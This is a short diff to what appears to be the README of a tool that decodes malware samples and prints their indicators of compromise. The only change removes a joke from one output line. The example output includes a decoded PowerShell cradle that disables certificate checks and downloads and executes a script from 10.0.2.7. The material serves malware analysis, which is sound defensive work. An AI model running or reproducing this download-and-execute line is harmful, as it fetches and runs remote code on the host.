@@ -23,7 +23,7 @@
 > deco.py -f sample.txt -i
 [+] Print IoC
 url -> https://10.0.2.7:443/utag/lbg/main/prod/_bs
-fqdn -> system.net <= XD
+fqdn -> system.net
 ipv4addr -> 10.0.2.7
 [+] Output Base64 Decoded
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (new-object system.net.webclient).downloadstring('https://10.0.2.7:443/utag/lbg/main/prod/_bs')
